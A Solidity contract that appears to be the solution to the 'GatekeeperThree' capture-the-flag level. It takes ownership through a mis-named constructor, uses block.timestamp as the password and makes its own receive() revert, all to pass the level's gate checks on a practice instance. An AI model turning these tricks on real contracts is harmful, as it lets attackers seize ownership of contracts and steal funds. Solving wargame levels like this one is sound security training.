// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./interfaces/28_IGatekeeperThree.sol";

address constant INSTANCE = 0x5571222b565D983Da7CA22AAC9832278A80970Cf;

contract GatekeeperThreeSolution {
    IGatekeeperThree instance = IGatekeeperThree(INSTANCE);

    function solve() external payable {
        instance.construct0r();
        instance.createTrick();
        instance.getAllowance(block.timestamp);
        instance.getAllowance(block.timestamp);
        address(instance).call{value: 0.0011 ether}("");
        instance.enter();
    }

    receive() external payable {
        revert();
    }
}
